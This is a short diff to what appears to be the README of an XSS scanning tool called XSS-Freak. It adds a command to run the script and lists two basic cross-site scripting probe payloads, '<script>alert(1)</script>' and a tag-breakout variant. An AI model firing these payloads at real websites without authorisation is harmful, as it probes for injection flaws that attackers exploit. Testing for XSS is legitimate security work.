@@ -13,4 +13,12 @@ python3 -m venv venv
 source venv/bin/activate
 
 pip install -U -r requirements.txt
+
+python3 XSS-Freak.py
+```
+payloads
+
+```
+<script>alert(1)</script>
+><script>alert(1)</script>
 ```
